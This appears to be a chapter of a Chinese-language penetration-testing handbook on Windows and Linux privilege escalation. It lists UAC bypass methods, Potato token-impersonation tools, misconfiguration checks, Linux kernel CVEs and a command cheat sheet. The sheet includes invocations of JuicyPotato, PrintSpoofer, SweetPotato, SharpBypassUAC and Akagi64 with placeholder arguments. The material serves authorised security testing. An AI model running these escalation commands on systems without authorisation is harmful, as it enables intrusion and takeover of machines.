# 第5章 权限提升（Windows / Linux）

## Windows UAC

- UAC 白名单程序可能通过 `autoElevate` 静默提权。
- 常见方法：fodhelper、ComputerDefaults、sdclt、slui、UACME。
- 修改 `HKCU\Software\Classes\ms-settings\Shell\Open\command` 后必须恢复，否则影响系统功能。

```cmd
sigcheck.exe -m c:\windows\system32\*.exe | findstr /r ".exe:.*<autoElevate>true</autoElevate>"
reg delete HKCU\Software\Classes\ms-settings /f
```

## 令牌与土豆系列

- 检查 `whoami /priv` 中 `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`。
- JuicyPotato、PrintSpoofer、RoguePotato、SweetPotato 等适用于不同 Windows 版本。
- 先确认 Spooler/DCOM/RPC 等依赖服务状态。

## 错误配置

- 未加引号服务路径。
- 服务二进制或目录权限可写。
- `AlwaysInstallElevated`。
- 使用 AccessChk、PowerUp/PowerSploit 做授权检查。

## Linux

- 内核漏洞：Dirty Cow、DirtyPipe、overlayfs、Polkit、sudo 等，先核对内核/发行版/补丁。
- 错误配置：sudoers、SUID、可写服务文件、cron、容器权限等。
- 检测工具：linux-exploit-suggester、linuxprivchecker、unix-privesc-check。

```bash
find / -user root -perm -4000 -print 2>/dev/null
sudo -l
```

## 命令速查

### Windows 检查

```cmd
whoami /priv
whoami /groups
sc query Spooler
sc query DcomLaunch
sc query RpcSs
wmic service get name,displayname,pathname,startmode | findstr /i Auto
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Potato / UAC

```cmd
JuicyPotato.exe -l <PORT> -p "C:\Windows\System32\cmd.exe" -t * -c <CLSID>
PrintSpoofer.exe -c "cmd /c whoami"
SweetPotato.exe -p <COMMAND> -e PrintSpoofer
SharpBypassUAC.exe -b fodhelper -e <BASE64_COMMAND>
Akagi64.exe <METHOD_ID> C:\ProgramData\tool.exe
reg delete HKCU\Software\Classes\ms-settings /f
```

### Linux 检查

```bash
uname -a
cat /etc/os-release
sudo -l
id
find / -user root -perm -4000 -print 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null
./linux-exploit-suggester.sh
python linuxprivchecker.py
./unix-privesc-check standard
```

### 常见 CVE

```text
Dirty Cow       CVE-2016-5195
dirty_sock      CVE-2019-7304
ptrace          CVE-2019-13272
sudo heap       CVE-2021-3156
Polkit pkexec   CVE-2021-4034
overlayfs       CVE-2021-3493
DirtyPipe       CVE-2022-0847
```
